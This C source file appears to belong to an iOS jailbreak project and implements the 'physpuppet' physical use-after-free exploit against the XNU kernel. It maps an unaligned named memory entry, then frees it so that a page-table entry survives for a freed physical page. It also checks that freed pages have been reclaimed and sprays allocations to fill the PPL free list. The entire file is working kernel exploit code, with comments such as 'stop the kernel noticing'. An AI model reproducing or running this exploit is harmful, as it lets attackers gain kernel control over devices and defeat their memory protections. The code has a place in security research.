#include "puaf.h"
#include <mach/mach.h>
#include <stdbool.h>

void physpuppet_run(int nPages, uint64_t puafPages[])
{
    for (uint64_t i = 0; i < nPages; i++) {
        mach_port_t named_entry = MACH_PORT_NULL;
        vm_address_t address = 0;
        
        // Create a named entry of size pages(2) + 1 (unaligned allocation)
        mach_memory_object_memory_entry_64(mach_host_self(), true, VMNE_SIZE, 3, 0, &named_entry);
        
        // Create the vm_map_entry with an aligned start but unaligned end
        vm_map(mach_task_self(), &address, -1, 0, 9, named_entry, VME_OFFSET, false, 3, 3, 1);
        
        // Write to (and fault in) all of the pages covered by the named entry
        memset((void*)(address), 'A', VME_SIZE);
        
        // Deallocate pages(2) bytes, XNU shifts and doesn't see the final page, leaving it's PTE entry intact
        vm_deallocate(mach_task_self(), address, VME_SIZE);
        
        // Destroy the named entry and put it's pages onto the free list
        mach_port_deallocate(mach_task_self(), named_entry);
        
        // We have a free page!
        puafPages[i] = address + VME_OFFSET;
        
        // Re-map the address to stop the kernel noticing the difference between our pmap and vm_map
        vm_allocate(mach_task_self(), &address, VME_SIZE, VM_FLAGS_FIXED);
        
        // Fault in the first page, not the second, so that it gets removed on exit
        memset((void*)(address), 'A', VME_OFFSET);
    }
}

void physpuppet_deinit(int nPages, uint64_t puafPages[], uint64_t puafPage) {
    for (uint64_t i = 0; i < nPages; i++) {
        uint64_t address = puafPages[i];
        if (address == puafPage) continue;
        vm_deallocate(mach_task_self(), address - VME_OFFSET, VME_SIZE);
        puafPages[i] = 0;
    }
    return;
}


struct CopyInfo {
    vm_address_t source;
    vm_address_t dest;
    vm_size_t size;
} copyInfo;


const char marker[16] = "libprejailbreak";
const uint64_t markerSize = sizeof(marker);

void copy_init(void) {
    copyInfo.size = pages(4);
    vm_allocate(mach_task_self(), &copyInfo.source, copyInfo.size, VM_FLAGS_ANYWHERE | VM_FLAGS_PURGABLE);
    vm_allocate(mach_task_self(), &copyInfo.dest, copyInfo.size, VM_FLAGS_ANYWHERE);
    for (uint64_t offset = pages(0); offset < copyInfo.size; offset += pages(1)) {
        bcopy(marker, (void *)copyInfo.source, markerSize);
        bcopy(marker, (void *)copyInfo.dest, markerSize);
    }
}

void copy_deinit(void)
{
    vm_deallocate(mach_task_self(), copyInfo.source, copyInfo.size);
    vm_deallocate(mach_task_self(), copyInfo.dest, copyInfo.size);
}

bool puaf_check_free_pages(int nPages, uint64_t puafPages[]) {
    uint64_t copyPages = copyInfo.size / pages(1);
    uint64_t goal = nPages / 4;
    uint64_t max = 400000;
    
    for (uint64_t nGrabbed = copyPages; nGrabbed < max; nGrabbed += copyPages) {
        vm_copy(mach_task_self(), copyInfo.source, copyInfo.size, copyInfo.dest);
        uint64_t pagesGrabbed = 0;
        for (uint64_t i = 0; i < nPages; i++) {
            uint64_t curPage = puafPages[i];
            if (!memcmp(marker, (void *)curPage, markerSize)) {
                if (++pagesGrabbed == goal) {
                    return true;
                }
            }
        }
    }
    return false;
}

void puaf_fill_ppl_free_list(void) {
    const uint64_t given_ppl_pages_max = 10000;
    const uint64_t l2_block_size = (1ull << 25);
    
    vm_address_t addresses[given_ppl_pages_max] = {};
    vm_address_t address = 0;
    uint64_t given_ppl_pages = 0;
    
    task_vm_info_data_t data = {};
    task_info_t info = (task_info_t)(&data);
    mach_msg_type_number_t count = TASK_VM_INFO_COUNT;
    task_info(mach_task_self(), TASK_VM_INFO, info, &count);
    
    while (true) {
        address += l2_block_size;
        if (address < data.min_address) {
            continue;
        }
        
        if (address >= data.max_address) {
            break;
        }
        
        kern_return_t kret = vm_allocate(mach_task_self(), &address, pages(1), VM_FLAGS_FIXED);
        if (kret == KERN_SUCCESS) {
            memset((void*)(address), 'A', 1);
            addresses[given_ppl_pages] = address;
            if (++given_ppl_pages == given_ppl_pages_max) {
                break;
            }
        }
    }
    
    for (uint64_t i = 0; i < given_ppl_pages; i++) {
        vm_deallocate(mach_task_self(), addresses[i], pages(1));
    }
}
